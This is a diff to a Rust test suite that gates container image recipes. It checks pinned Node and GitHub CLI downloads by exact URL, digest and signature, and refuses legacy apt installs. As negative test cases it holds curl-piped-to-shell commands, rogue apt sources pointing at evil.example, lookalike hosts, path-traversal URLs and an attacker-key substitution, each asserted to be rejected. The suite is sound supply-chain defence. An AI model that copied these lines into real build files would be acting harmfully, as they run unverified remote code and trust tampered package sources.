+    let platform_keys: &[&str] = if name == "gh" {
+        &["url", "archive", "member_prefix", "sha256", "bundle"]
+    } else {
+        &["url", "archive", "member_prefix", "sha256"]
+    };
+    let entries = exact_platforms(&members["platforms"], platform_keys, "artifact platforms")?;
+    let mut archives = BTreeMap::new();
+    for (platform, entry) in PLATFORMS.iter().zip(entries) {
+        let context = format!("{name} {platform}");
+        let url = text(&entry["url"], &format!("{context} url"))?;
+        let origin = if name == "node" {
+            "https://nodejs.org/dist/"
+        } else {
+            "https://github.com/cli/cli/releases/download/"
+        };
+        let expected = artifact_filename(name, &version, platform);
+        // The expected URL is *computed*, not matched by prefix: `..` segments
+        // (which GitHub resolves into another repository), a lookalike host, an
+        // extra path segment or a query string must not be able to name bytes
+        // that are not the reviewed release asset.
+        let canonical = format!("{origin}v{version}/{expected}");
+        if url != canonical {
+            return Err(format!(
+                "{context}: url must be exactly {canonical}, found {url}"
+            ));
+        }
+        let (suffix, kind) = match expected.rsplit_once('.') {
+            Some((_, "xz")) => (".tar.xz", "tar.xz"),
+            _ => (".tar.gz", "tar.gz"),
+        };
+        if text(&entry["archive"], &format!("{context} archive"))? != kind {
+            return Err(format!("{context}: archive must be {kind}"));
+        }
+        let prefix = format!("{}/", &expected[..expected.len() - suffix.len()]);
+        if text(&entry["member_prefix"], &format!("{context} member_prefix"))? != prefix {
+            return Err(format!("{context}: member_prefix must be {prefix}"));
+        }
+        let digest = text(&entry["sha256"], &format!("{context} sha256"))?;
+        if !is_lower_hex(&digest, 64) {
+            return Err(format!("{context}: sha256 must be a lower-case SHA-256"));
+        }
+        let bundle = if name == "gh" {
+            let bundle = exact(
+                &entry["bundle"],
+                &["path", "sha256"],
+                &format!("{context} bundle"),
+            )?;
+            let path = text(&bundle["path"], &format!("{context} bundle path"))?;
+            let wanted = artifact_bundle_name(&version, platform);
+            if path != wanted {
+                return Err(format!("{context}: bundle must be {wanted}"));
+            }
+            let digest = text(&bundle["sha256"], &format!("{context} bundle sha256"))?;
+            if !is_lower_hex(&digest, 64) {
+                return Err(format!(
+                    "{context}: bundle sha256 must be a lower-case SHA-256"
+                ));
+            }
+            Some((path, digest))
+        } else {
+            None
+        };
+        archives.insert(
+            (*platform).to_owned(),
+            ArtifactArchive {
+                url,
+                archive: kind.to_owned(),
+                member_prefix: prefix,
+                digest,
+                bundle,
+            },
+        );
+    }
+    Ok(ArtifactPin {
+        name: name.to_owned(),
+        version,
+        payload,
+        links,
+        bundled,
+        archives,
+        authentication: parse_artifact_authentication(name, &members["authentication"])?,
+    })
+}
+
+/// The committed artifact evidence files, and the manifest's own entry for each:
+/// the gate cannot hash, so the binding it *can* check is that the bytes a build
+/// mounts are the bytes the generated manifest lists.
+fn artifact_evidence_paths(pin: &ArtifactPin) -> Vec<String> {
+    let mut paths = Vec::new();
+    match &pin.authentication {
+        ArtifactAuthentication::OpenPgp { key_path, .. } => paths.push(key_path.clone()),
+        ArtifactAuthentication::Sigstore { .. } => {
+            for archive in pin.archives.values() {
+                if let Some((bundle, _)) = &archive.bundle {
+                    paths.push(bundle.clone());
+                }
+            }
+        }
+    }
+    paths
+}
+
+fn base_input_manifest_paths() -> Vec<String> {
+    read_text(BASE_INPUT_MANIFEST)
+        .lines()
+        .filter_map(|line| line.get(66..).map(str::to_owned))
+        .collect()
+}
+
+/// What the base recipe may consume for these artifacts: one RUN that mounts the
+/// installer and the pins read-only and invokes both with the build's own
+/// `TARGETARCH`, so the selection cannot be pinned to the architecture of the
+/// machine that built the image.
+fn artifact_install_run(base: &str) -> Result<String, String> {
+    let installer = format!("{ARTIFACT_SOURCE_ROOT}/{ARTIFACT_INSTALLER}");
+    let runs: Vec<String> = dockerfile_instructions(base)
+        .into_iter()
+        .filter(|instruction| {
+            instruction.starts_with("RUN ") && instruction.contains(&format!("bash {installer}"))
+        })
+        .collect();
+    if runs.len() != 1 {
+        return Err(format!(
+            "the base recipe must install the pinned artifacts in exactly one RUN, found {}",
+            runs.len()
+        ));
+    }
+    let run = runs.into_iter().next().expect("one run");
+    let mounts = leading_mount_specs(&run);
+    for source in [ARTIFACT_INSTALLER, "artifacts"] {
+        let spec = mounts
+            .iter()
+            .find(|spec| mount_field(spec, "source").as_deref() == Some(source))
+            .ok_or_else(|| format!("the artifact run does not mount {source}"))?;
+        if mount_field(spec, "target") != Some(format!("{ARTIFACT_SOURCE_ROOT}/{source}")) {
+            return Err(format!(
+                "{source} must be mounted at {ARTIFACT_SOURCE_ROOT}/{source}"
+            ));
+        }
+        if !mount_flag(spec, "ro") {
+            return Err(format!("{source} must be a read-only mount"));
+        }
+    }
+    let tokens: Vec<&str> = run.split_whitespace().collect();
+    for name in ["node", "gh"] {
+        let expected = [
+            installer.as_str(),
+            name,
+            &format!("{ARTIFACT_SOURCE_ROOT}/artifacts/{name}.json") as &str,
+            "\"$TARGETARCH\"",
+        ];
+        let found = tokens
+            .windows(expected.len())
+            .any(|window| window == expected.as_slice());
+        if !found {
+            return Err(format!(
+                "the artifact run must invoke {ARTIFACT_INSTALLER} {name} \
+                 {ARTIFACT_SOURCE_ROOT}/artifacts/{name}.json with the build's TARGETARCH"
+            ));
+        }
+    }
+    if !run.contains(&format!("ARTIFACT_SOURCE_DIR={ARTIFACT_SOURCE_ROOT}")) {
+        return Err(format!(
+            "the artifact run must set ARTIFACT_SOURCE_DIR={ARTIFACT_SOURCE_ROOT}"
+        ));
+    }
+    Ok(run)
+}
+
+/// Every maintained helper, minus verbatim upstream provenance snapshots and the
+/// baseline checker itself, which necessarily names apt paths and flags.
+///
+/// The set is chosen by *program text*, not by the `.sh` extension: a mounted
+/// `images/artifacts/extra.sh`-style helper, a `.py` helper with a shell body and
+/// an executable without an extension are all sources a build runs, so the pipe,
+/// package and artifact rules apply to each of them (#96 review).
+fn maintained_helper_sources() -> BTreeMap<String, String> {
+    let mut sources = repository_files("images", None, None);
+    sources.extend(repository_files("examples", None, None));
     sources.retain(|path, _| {
-        !is_provenance_snapshot(Path::new(path)) && path != "images/apt-policy/check-sources.sh"
+        let name = path.rsplit('/').next().unwrap_or(path);
+        is_program_text(name)
+            && !is_provenance_snapshot(Path::new(path))
+            && path != "images/apt-policy/check-sources.sh"
     });
     sources
 }
@@ -3217,20 +4072,12 @@ fn the_parent_inventory_pins_every_maintained_recipe() {
     }
     assert!(keyrings.contains("  usr/share/keyrings/debian-archive-keyring.pgp"));
     check_digest_mentions(&parent_documents(), &inventory).unwrap();
-    check_apt_sources(&inventory, &recipes, &maintained_shell_sources()).unwrap();
+    check_legacy_install_paths(&recipes, &maintained_helper_sources()).unwrap();
     assert_eq!(
-        inventory.apt_open_gaps.len(),
-        2,
-        "two reviewed legacy apt instructions (#96)"
+        read_json(PARENT_INVENTORY)["apt_open_gaps"],
+        Value::Array(vec![]),
+        "both recorded third-party apt instructions are gone with their installers (#96)"
     );
-    for gap in &inventory.apt_open_gaps {
-        assert_eq!(gap.recipe, "images/Dockerfile");
-        assert_eq!(gap.owner, APT_GAP_OWNER);
-        assert!(
-            physical_instructions(&recipes[&gap.recipe]).contains(&gap.instruction),
-            "a recorded gap must still be one instruction of its recipe"
-        );
-    }
 }
 
 /// `attestations.py` is the verifier that refuses an inventory naming any other
@@ -3414,24 +4261,11 @@ fn parent_inventory_blocks_reject_edits() {
             "\"revised\":".to_owned(),
         ),
         (
-            "apt gap owner",
-            APT_GAP_OWNER.to_owned(),
-            "https://github.com/gregwebs/agent-vm-images/issues/95".to_owned(),
-        ),
-        (
-            "apt gap recipe",
-            "\"recipe\": \"images/Dockerfile\"".to_owned(),
-            "\"recipe\": \"images/Other/Dockerfile\"".to_owned(),
-        ),
-        (
-            "apt gap instruction shape",
-            "\"instruction\": \"RUN install -dm 755".to_owned(),
-            "\"instruction\": \"CMD install -dm 755".to_owned(),
-        ),
-        (
-            "apt gap missing owner",
-            "\"owner\":".to_owned(),
-            "\"owned\":".to_owned(),
+            "recorded apt gap",
+            "\"apt_open_gaps\": []".to_owned(),
+            "\"apt_open_gaps\": [{\"recipe\": \"images/Dockerfile\", \"instruction\": \
+             \"RUN true\", \"owner\": \"https://github.com/gregwebs/agent-vm-images/issues/96\"}]"
+                .to_owned(),
         ),
     ] {
         let edited = source.replacen(&from, &to, 1);
@@ -3489,8 +4323,8 @@ fn parent_inventory_blocks_reject_edits() {
         ),
         (
             "apt gap record",
-            "\"apt_open_gaps\": [".to_owned(),
-            "\"apt_open_gaps\": [], \"apt_open_gaps\": [".to_owned(),
+            "\"apt_open_gaps\": []".to_owned(),
+            "\"apt_open_gaps\": [], \"apt_open_gaps\": []".to_owned(),
         ),
     ];
     for (label, needle, duplicated) in duplications {
@@ -3505,70 +4339,249 @@ fn parent_inventory_blocks_reject_edits() {
 }
 
 #[test]
-fn apt_sources_are_official_or_recorded_gaps() {
-    let inventory = parse_parent_inventory(&read_text(PARENT_INVENTORY)).unwrap();
+fn apt_sources_are_official_only_and_the_legacy_installs_stay_gone() {
+    parse_parent_inventory(&read_text(PARENT_INVENTORY)).unwrap();
     let recipes = maintained_recipes();
-    let shell = maintained_shell_sources();
-    check_apt_sources(&inventory, &recipes, &shell).unwrap();
-    let node = inventory
-        .apt_open_gaps
-        .iter()
-        .find(|gap| {
-            gap.instruction
-                .contains("https://deb.nodesource.com/setup_22.x")
-        })
-        .expect("the NodeSource install is a recorded gap")
-        .instruction
-        .clone();
-    let github = inventory
-        .apt_open_gaps
-        .iter()
-        .find(|gap| gap.instruction.contains("githubcli-archive-keyring.gpg"))
-        .expect("the GitHub CLI repository is a recorded gap")
-        .instruction
-        .clone();
+    let shell = maintained_helper_sources();
+    check_legacy_install_paths(&recipes, &shell).unwrap();
     let base = recipes["images/Dockerfile"].clone();
     let standard = recipes["images/standard/Dockerfile"].clone();
     let go_dev = recipes["examples/layers/go-dev/Dockerfile"].clone();
 
-    let appended = github.replace(
-        "\n && rm -rf /var/lib/apt/lists/*",
-        "\n && echo \"deb http://evil.example stable main\" \\\n        > /etc/apt/sources.list.d/evil.list \\\n && rm -rf /var/lib/apt/lists/*",
+    // One row per spelling of the two removed instructions (#96). A recipe that
+    // puts any of them back is refused whether it writes apt state, downloads the
+    // keyring, executes the setup script or simply asks apt for the package.
+    let legacy_rows: Vec<(&str, BTreeMap<String, String>, &str)> = vec![
+        (
+            "the NodeSource setup script re-added",
+            edited_recipe(
+                &recipes,
+                "images/Dockerfile",
+                &base,
+                &format!("{base}RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash -\n"),
+            ),
+            APT_SOURCE_REFUSAL,
+        ),
+        (
+            "the NodeSource apt repository re-added",
+            edited_recipe(
+                &recipes,
+                "images/Dockerfile",
+                &base,
+                &format!(
+                    "{base}RUN echo 'deb https://deb.nodesource.com/node_22.x nodistro main' > /opt/agent-vm/node.list\n"
+                ),
+            ),
+            APT_SOURCE_REFUSAL,
+        ),
+        (
+            "the GitHub CLI package repository re-added",
+            edited_recipe(
+                &recipes,
+                "images/Dockerfile",
+                &base,
+                &format!(
+                    "{base}RUN echo 'deb https://cli.github.com/packages stable main' > /opt/agent-vm/github-cli.list\n"
+                ),
+            ),
+            APT_SOURCE_REFUSAL,
+        ),
+        (
+            "the GitHub CLI keyring download re-added",
+            edited_recipe(
+                &recipes,
+                "images/Dockerfile",
+                &base,
+                &format!(
+                    "{base}RUN curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg > /opt/agent-vm/key.gpg\n"
+                ),
+            ),
+            APT_SOURCE_REFUSAL,
+        ),
+        (
+            "a sources.list.d/github-cli entry",
+            edited_recipe(
+                &recipes,
+                "images/Dockerfile",
+                &base,
+                &format!(
+                    "{base}RUN install -Dm 644 /tmp/gh.list /opt/agent-vm/sources.list.d/github-cli.list\n"
+                ),
+            ),
+            APT_SOURCE_REFUSAL,
+        ),
+        (
+            "nodejs through apt",
+            edited_recipe(
+                &recipes,
+                "images/Dockerfile",
+                &base,
+                &format!("{base}RUN apt-get install -y --no-install-recommends nodejs\n"),
+            ),
+            "apt may not install nodejs",
+        ),
+        (
+            "gh through apt",
+            edited_recipe(
+                &recipes,
+                "images/Dockerfile",
+                &base,
+                &format!("{base}RUN apt-get install -y --no-install-recommends gh\n"),
+            ),
+            "apt may not install gh",
+        ),
+        (
+            "npm through apt in the standard recipe",
+            edited_recipe(
+                &recipes,
+                "images/standard/Dockerfile",
+                &standard,
+                &format!("{standard}RUN apt-get install -y npm\n"),
+            ),
+            "apt may not install npm",
+        ),
+    ];
+    for (label, edited, expected) in legacy_rows {
+        let error = check_legacy_install_paths(&edited, &shell)
+            .expect_err(&format!("accepted a legacy install: {label}"));
+        assert!(error.contains("#96"), "{label}: {error}");
+        assert!(error.contains(expected), "{label}: {error}");
+    }
+
+    // A downloaded script may not reach a shell through a pipe, in any of the
+    // spellings a reviewer might use; the interpreter is matched as a word, so a
+    // download piped into `tee` or verified by `sha256sum` stays legal.
+    for pipe in ["| bash -", "| sh", "| /bin/sh", "| sudo bash", "| dash"] {
+        let edited = edited_recipe(
+            &recipes,
+            "images/Dockerfile",
+            &base,
+            &format!("{base}RUN curl -fsSL https://example.invalid/setup.sh {pipe}\n"),
+        );
+        let error = check_legacy_install_paths(&edited, &shell)
+            .expect_err(&format!("accepted a piped script: {pipe}"));
+        assert!(
+            error.contains("may not be executed through a pipe"),
+            "{pipe}: {error}"
+        );
+        assert!(error.contains("#96"), "{pipe}: {error}");
+    }
+    let piped_to_a_tool = edited_recipe(
+        &recipes,
+        "images/Dockerfile",
+        &base,
+        &format!("{base}RUN curl -fsSL https://example.invalid/x.tar.gz | tee /tmp/x.tar.gz\n"),
     );
-    assert_ne!(appended, github, "the extension mutation applies");
-    let altered_key = github.replace(
-        "https://cli.github.com/packages/githubcli-archive-keyring.gpg",
-        "https://cli.github.com.evil/packages/githubcli-archive-keyring.gpg",
+    check_legacy_install_paths(&piped_to_a_tool, &shell).unwrap();
+
+    // Ordinary apt spellings: the literal `"apt-get install"` search this rule
+    // started with missed every one of them (#96 review).
+    let apt_spellings: Vec<(&str, String)> = vec![
+        (
+            "options before the verb",
+            format!("{base}RUN apt-get -y install nodejs\n"),
+        ),
+        (
+            "a continuation before the verb",
+            format!("{base}RUN apt-get \\\n    install -y nodejs\n"),
+        ),
+        (
+            "an architecture qualifier",
+            format!("{base}RUN apt-get install nodejs:amd64\n"),
+        ),
+        (
+            "a package glob",
+            format!("{base}RUN apt-get install 'nodejs*'\n"),
+        ),
+        (
+            "a quoted gh the recipe then makes effective",
+            format!("{base}RUN apt-get install 'gh' && rm /usr/local/bin/gh\n"),
+        ),
+        (
+            "an option that takes a value",
+            format!("{base}RUN apt-get -o Acquire::Retries=3 install gh\n"),
+        ),
+        (
+            "sudo in front",
+            format!("{base}RUN sudo apt-get install -y npx\n"),
+        ),
+        (
+            "env and an assignment in front",
+            format!("{base}RUN env NODE=1 apt-get install -y npm\n"),
+        ),
+        (
+            "a reinstall of a pinned version",
+            format!("{base}RUN apt-get reinstall nodejs=22.0.0\n"),
+        ),
+    ];
+    for (label, instruction) in apt_spellings {
+        let edited = edited_recipe(&recipes, "images/Dockerfile", &base, &instruction);
+        let error = check_legacy_install_paths(&edited, &shell)
+            .expect_err(&format!("accepted an apt spelling: {label}"));
+        assert!(error.contains("apt may not install"), "{label}: {error}");
+        assert!(error.contains("#96"), "{label}: {error}");
+    }
+
+    // The pipe and package rules cover every maintained helper, whatever its
+    // extension: a mounted `.sh` or `.py` helper is source a build runs.
+    let helper_mutations: Vec<(&str, &str, &str)> = vec![
+        (
+            "images/artifacts/extra.sh",
+            "curl -fsSL https://example.invalid/setup.sh | sh\n",
+            "may not be executed through a pipe",
+        ),
+        (
+            "images/tools/example/helper.py",
+            "subprocess.run('curl -fsSL https://example.invalid/setup.sh | sh', shell=True)\n",
+            "may not be executed through a pipe",
+        ),
+        (
+            "images/tools/example/env-wrapper.sh",
+            "curl -fsSL https://example.invalid/setup.sh | env sh\n",
+            "may not be executed through a pipe",
+        ),
+        (
+            "images/tools/example/install-package.py",
+            "apt-get -y install nodejs\n",
+            "apt may not install nodejs",
+        ),
+    ];
+    for (path, body, needle) in helper_mutations {
+        let mut edited = shell.clone();
+        edited.insert(path.to_owned(), body.to_owned());
+        let error = check_legacy_install_paths(&recipes, &edited)
+            .expect_err(&format!("accepted a helper mutation: {path}"));
+        assert!(error.contains(needle), "{path}: {error}");
+        assert!(error.contains("#96"), "{path}: {error}");
+    }
+
+    // A recipe may not download an archive and unpack it by hand: that install
+    // surface belongs to the pinned installer.
+    let manual_install = edited_recipe(
+        &recipes,
+        "images/Dockerfile",
+        &base,
+        &format!(
+            "{base}ARG NODE_TARBALL=https://nodejs.org/dist/v22.23.4/node-v22.23.4-linux-x64.tar.xz\n\
+             RUN curl -fsSL \"$NODE_TARBALL\" -o /tmp/n.tar.xz \\\n && tar -xf /tmp/n.tar.xz -C /usr/local\n"
+        ),
     );
-    assert_ne!(altered_key, github, "the key URL mutation applies");
-    let insecure_gap = github.replace(
-        "apt-get install -y --no-install-recommends gh",
-        "apt-get install -y --allow-unauthenticated --no-install-recommends gh",
-    );
-    assert_ne!(insecure_gap, github, "the insecure-flag mutation applies");
-    let removed = base.replace(&node, "");
-    assert_ne!(removed, base, "the gap-removal mutation applies");
+    let error = check_legacy_install_paths(&manual_install, &shell)
+        .expect_err("accepted a hand-unpacked archive");
+    assert!(error.contains("may not be unpacked by hand"), "{error}");
 
     let recipe_mutations: Vec<(&str, BTreeMap<String, String>, &str)> = vec![
         (
-            "extra source inside the recorded instruction",
-            edited_recipe(&recipes, "images/Dockerfile", &github, &appended),
-            "apt gap changed/closed",
-        ),
-        (
-            "altered key endpoint inside the recorded instruction",
-            edited_recipe(&recipes, "images/Dockerfile", &github, &altered_key),
-            "apt gap changed/closed",
-        ),
-        (
-            "insecure flag inside the recorded instruction",
-            edited_recipe(&recipes, "images/Dockerfile", &github, &insecure_gap),
+            "insecure apt flag",
+            edited_recipe(
+                &recipes,
+                "images/Dockerfile",
+                &base,
+                &format!(
+                    "{base}RUN apt-get install -y --allow-unauthenticated --no-install-recommends zsh\n"
+                ),
+            ),
             "insecure apt construction",
-        ),
-        (
-            "NodeSource removed but the gap kept",
-            edited_recipe(&recipes, "images/Dockerfile", &node, ""),
-            "apt gap changed/closed",
         ),
         (
             "new .sources in the standard recipe",
@@ -3580,7 +4593,7 @@ fn apt_sources_are_official_or_recorded_gaps() {
                     "{standard}RUN echo 'Types: deb' > /etc/apt/sources.list.d/extra.sources\n"
                 ),
             ),
-            "not a recorded exact instruction",
+            APT_SOURCE_REFUSAL,
         ),
         (
             "new .list in an example recipe",
@@ -3592,7 +4605,7 @@ fn apt_sources_are_official_or_recorded_gaps() {
                     "{go_dev}RUN echo 'deb http://evil.example stable main' > /etc/apt/sources.list.d/evil.list\n"
                 ),
             ),
-            "not a recorded exact instruction",
+            APT_SOURCE_REFUSAL,
         ),
         (
             "bare add-apt-repository",
@@ -3630,7 +4643,7 @@ fn apt_sources_are_official_or_recorded_gaps() {
         ),
     ];
     for (label, edited, expected) in recipe_mutations {
-        let error = check_apt_sources(&inventory, &edited, &shell)
+        let error = check_legacy_install_paths(&edited, &shell)
             .expect_err(&format!("accepted an apt mutation: {label}"));
         assert!(error.contains(expected), "{label}: {error}");
         if expected != "insecure apt construction" {
@@ -3706,12 +4719,9 @@ fn apt_sources_are_official_or_recorded_gaps() {
     for (label, edited) in source_spellings {
         let mut source = recipes.clone();
         source.insert("images/standard/Dockerfile".to_owned(), edited);
-        let error = check_apt_sources(&inventory, &source, &shell)
+        let error = check_legacy_install_paths(&source, &shell)
             .expect_err(&format!("accepted an apt source spelling: {label}"));
-        assert!(
-            error.contains("not a recorded exact instruction"),
-            "{label}: {error}"
-        );
+        assert!(error.contains(APT_SOURCE_REFUSAL), "{label}: {error}");
     }
 
     let script_mutations: Vec<(&str, String, &str)> = vec![
@@ -3724,24 +4734,30 @@ fn apt_sources_are_official_or_recorded_gaps() {
             "new source write in a maintained script",
             "echo 'deb http://evil.example stable main' > /etc/apt/sources.list.d/evil.list\n"
                 .to_owned(),
-            "not a recorded exact instruction",
+            APT_SOURCE_REFUSAL,
         ),
         (
             "external setup endpoint in a maintained script",
             "curl -fsSL https://deb.nodesource.com/setup_22.x | bash -\n".to_owned(),
-            "not a recorded exact instruction",
+            APT_SOURCE_REFUSAL,
+        ),
+        (
+            "GitHub CLI keyring in a maintained script",
+            "curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg > /opt/agent-vm/githubcli-archive-keyring.gpg\n"
+                .to_owned(),
+            APT_SOURCE_REFUSAL,
         ),
         (
             "apt configuration directory override in a maintained script",
             "printf 'Dir::Etc::SourceParts \"/opt/evil/\";\\n' > /etc/apt/apt.conf.d/99-evil\n"
                 .to_owned(),
-            "not a recorded exact instruction",
+            APT_SOURCE_REFUSAL,
         ),
     ];
     for (label, body, expected) in script_mutations {
         let mut edited = shell.clone();
         edited.insert("images/tools/example/install-example.sh".to_owned(), body);
-        let error = check_apt_sources(&inventory, &recipes, &edited)
+        let error = check_legacy_install_paths(&recipes, &edited)
             .expect_err(&format!("accepted a shell mutation: {label}"));
         assert!(error.contains(expected), "{label}: {error}");
     }
@@ -3753,7 +4769,409 @@ fn apt_sources_are_official_or_recorded_gaps() {
         "# apt-key add, deb http://deb.debian.org/debian and /etc/apt/sources.list\nset -eu\n"
             .to_owned(),
     );
-    check_apt_sources(&inventory, &recipes, &commented).unwrap();
+    check_legacy_install_paths(&recipes, &commented).unwrap();
+}
+
+#[test]
+fn artifact_pins_select_exact_identities_for_both_platforms() {
+    let manifest = base_input_manifest_paths();
+    for (name, path) in ARTIFACT_PINS {
+        let pin = parse_artifact_pin(name, &read_text(path))
+            .unwrap_or_else(|error| panic!("{path}: {error}"));
+        assert_eq!(pin.name, name);
+        assert!(
+            is_exact_version(&pin.version),
+            "{path}: an exact X.Y.Z version"
+        );
+        assert_eq!(
+            pin.archives.keys().map(String::as_str).collect::<Vec<_>>(),
+            PLATFORMS.to_vec(),
+            "{path}: exactly the two supported platforms"
+        );
+        for (platform, archive) in &pin.archives {
+            assert!(
+                archive.url.starts_with("https://"),
+                "{path}: {platform} url"
+            );
+            assert!(
+                is_lower_hex(&archive.digest, 64),
+                "{path}: {platform} digest"
+            );
+            assert!(
+                archive.url.contains(platform_token(name, platform)),
+                "{path}: {platform} url must name its architecture"
+            );
+            assert_eq!(
+                archive.archive,
+                if name == "node" { "tar.xz" } else { "tar.gz" },
+                "{path}: {platform} archive kind"
+            );
+        }
+        for evidence in artifact_evidence_paths(&pin) {
+            let listed = format!("artifacts/{evidence}");
+            assert!(
+                manifest.contains(&listed),
+                "the base input manifest must list {listed}: that is what binds the committed \
+                 evidence bytes to the build"
+            );
+            assert!(
+                !read_text(&format!("images/{listed}")).is_empty(),
+                "{listed} must not be empty"
+            );
+        }
+        match &pin.authentication {
+            ArtifactAuthentication::OpenPgp {
+                key_path,
+                fingerprint,
+                verified_on,
+                ..
+            } => {
+                assert_eq!(name, "node", "only Node has a signed manifest");
+                assert_eq!(fingerprint, NODE_RELEASE_FINGERPRINT);
+                assert_eq!(key_path, NODE_RELEASE_KEY);
+                assert!(is_date(verified_on));
+                assert!(
+                    read_text(&format!("images/artifacts/{key_path}"))
+                        .starts_with("-----BEGIN PGP PUBLIC KEY BLOCK-----"),
+                    "the committed node release key must be an ASCII-armoured public key"
+                );
+            }
+            ArtifactAuthentication::Sigstore {
+                policy, evidence, ..
+            } => {
+                assert_eq!(name, "gh", "only the GitHub CLI is attested");
+                for (key, expected) in GH_SIGSTORE_POLICY {
+                    assert_eq!(policy[key], expected, "gh policy {key}");
+                }
+                assert_eq!(policy["deny_self_hosted_runners"], "true");
+                assert!(!evidence.is_empty(), "gh authentication cites evidence");
+                for archive in pin.archives.values() {
+                    let (bundle, _) = archive
+                        .bundle
+                        .as_ref()
+                        .expect("the gh pin carries a bundle per platform");
+                    let raw = read_text(&format!("images/artifacts/{bundle}"));
+                    let first = raw.lines().next().expect("a bundle is one JSON line");
+                    let value = strict_json(first).expect("the committed bundle is JSON");
+                    let members = object(&value, "sigstore bundle").unwrap();
+                    assert!(members.contains_key("verificationMaterial"), "{bundle}");
+                    assert!(members.contains_key("dsseEnvelope"), "{bundle}");
+                }
+            }
+        }
+        assert_eq!(
+            label_value(
+                &read_text("images/Dockerfile"),
+                &format!("{ARTIFACT_LABEL_PREFIX}{name}")
+            ),
+            pin.version,
+            "the base image must label the version the pin selects"
+        );
+        if name == "node" {
+            assert!(
+                pin.links
+                    .contains(&("/usr/bin/node".to_owned(), "/usr/local/bin/node".to_owned())),
+                "the pinned interpreter path /usr/bin/node must stay a link to the artifact"
+            );
+            for entry in ["bin", "lib", "share"] {
+                assert!(
+                    pin.payload.contains(&entry.to_owned()),
+                    "the node payload is the whole reviewed archive, {entry} included"
+                );
+            }
+        }
+    }
+}
+
+#[test]
+fn artifact_pin_mutations_are_refused() {
+    for (name, path) in ARTIFACT_PINS {
+        let source = read_text(path);
+        let pin = parse_artifact_pin(name, &source).unwrap();
+        let amd64 = pin.archives["linux/amd64"].digest.clone();
+        let url = pin.archives["linux/amd64"].url.clone();
+        let version = pin.version.clone();
+        let prefix = pin.archives["linux/amd64"].member_prefix.clone();
+        let other = platform_token(name, "linux/arm64");
+        let origin = if name == "node" {
+            "https://nodejs.org/dist"
+        } else {
+            "https://github.com/cli/cli/releases/download"
+        };
+        // One row per field the gate promises to refuse, with the refusal it has
+        // to be: an assertion that accepts any nonempty error cannot tell a
+        // mutation of the intended field from one that hit another.
+        let mut rows: Vec<(String, String, String, &'static str)> = vec![
+            (
+                "unknown field".to_owned(),
+                "\"kind\":".to_owned(),
+                "\"sort\":".to_owned(),
+                "expected exactly",
+            ),
+            (
+                "schema bump".to_owned(),
+                "\"schema\": 1".to_owned(),
+                "\"schema\": 2".to_owned(),
+                "unsupported artifact pin schema",
+            ),
+            (
+                "missing platform".to_owned(),
+                "\"linux/arm64\": {".to_owned(),
+                "\"linux/armv8\": {".to_owned(),
+                "exactly the amd64 and arm64 platforms",
+            ),
+            (
+                "inexact version".to_owned(),
+                format!("\"version\": \"{version}\""),
+                "\"version\": \"latest\"".to_owned(),
+                "exact X.Y.Z",
+            ),
+            (
+                "short digest".to_owned(),
+                format!("\"sha256\": \"{amd64}\""),
+                format!("\"sha256\": \"{}\"", &amd64[..32]),
+                "lower-case SHA-256",
+            ),
+            (
+                "upper-case digest".to_owned(),
+                format!("\"sha256\": \"{amd64}\""),
+                format!("\"sha256\": \"{}\"", amd64.to_uppercase()),
+                "lower-case SHA-256",
+            ),
+            (
+                "traversal in the url".to_owned(),
+                url.clone(),
+                format!("{origin}/v{version}/../../../attacker/repo/{version}/").to_owned()
+                    + url.rsplit('/').next().unwrap(),
+                "url must be exactly",
+            ),
+            (
+                "lookalike host in the url".to_owned(),
+                url.clone(),
+                url.replace(origin, &format!("{origin}.evil")),
+                "url must be exactly",
+            ),
+            (
+                "extra path segment in the url".to_owned(),
+                url.clone(),
+                format!(
+                    "{origin}/v{version}/extra/{}",
+                    url.rsplit('/').next().unwrap()
+                ),
+                "url must be exactly",
+            ),
+            (
+                "query string in the url".to_owned(),
+                url.clone(),
+                format!("{url}?raw=1"),
+                "url must be exactly",
+            ),
+            (
+                "another repository in the url".to_owned(),
+                url.clone(),
+                format!("{origin}/attacker/repo/{}", url.rsplit('/').next().unwrap()),
+                "url must be exactly",
+            ),
+            (
+                "wrong architecture in the url".to_owned(),
+                url.clone(),
+                url.replace(platform_token(name, "linux/amd64"), other),
+                "url must be exactly",
+            ),
+            (
+                "member prefix that no filename derives from".to_owned(),
+                format!("\"member_prefix\": \"{prefix}\""),
+                format!("\"member_prefix\": \"{prefix}extra/\""),
+                "member_prefix must be",
+            ),
+            (
+                "payload escaping the destination".to_owned(),
+                "\"payload\": [".to_owned(),
+                "\"payload\": [\"../escape\",".to_owned(),
+                "payload entry must be relative",
+            ),
+            (
+                "destination outside /usr/local".to_owned(),
+                "\"destination\": \"/usr/local\"".to_owned(),
+                "\"destination\": \"/usr\"".to_owned(),
+                "destination must be /usr/local",
+            ),
+            (
+                "authentication deleted".to_owned(),
+                "\"authentication\": {".to_owned(),
+                "\"authentication-removed\": {".to_owned(),
+                "expected exactly",
+            ),
+        ];
+        if name == "node" {
+            let bundled = pin
+                .bundled
+                .clone()
+                .expect("the node pin records the bundled npm");
+            rows.push((
+                "bundled npm missing".to_owned(),
+                "\"bundled\": {".to_owned(),
+                "\"bundled-removed\": {".to_owned(),
+                "expected exactly",
+            ));
+            rows.push((
+                "bundled npm with a floating version".to_owned(),
+                format!("\"npm\": \"{bundled}\""),
+                "\"npm\": \"^10\"".to_owned(),
+                "exact X.Y.Z",
+            ));
+            rows.push((
+                "attacker key substituted".to_owned(),
+                NODE_RELEASE_FINGERPRINT.to_owned(),
+                "0000000000000000000000000000000000000000".to_owned(),
+                "fingerprint must be the reviewed",
+            ));
+            rows.push((
+                "signature method downgraded".to_owned(),
+                "\"method\": \"openpgp-signed-manifest\"".to_owned(),
+                "\"method\": \"hash-only\"".to_owned(),
+                "openpgp-signed-manifest",
+            ));
+            rows.push((
+                "key file renamed".to_owned(),
+                format!("\"path\": \"{NODE_RELEASE_KEY}\""),
+                "\"path\": \"attacker-key.asc\"".to_owned(),
+                "node key path must be",
+            ));
+            rows.push((
+                "manifest outside the dist origin".to_owned(),
+                format!("https://nodejs.org/dist/v{version}/SHASUMS256.txt"),
+                format!("https://nodejs.org.evil/dist/v{version}/SHASUMS256.txt"),
+                "node manifest url must be the nodejs.org dist origin",
+            ));
+        } else {
+            let bundle = pin.archives["linux/amd64"]
+                .bundle
+                .as_ref()
+                .expect("gh pins a bundle");
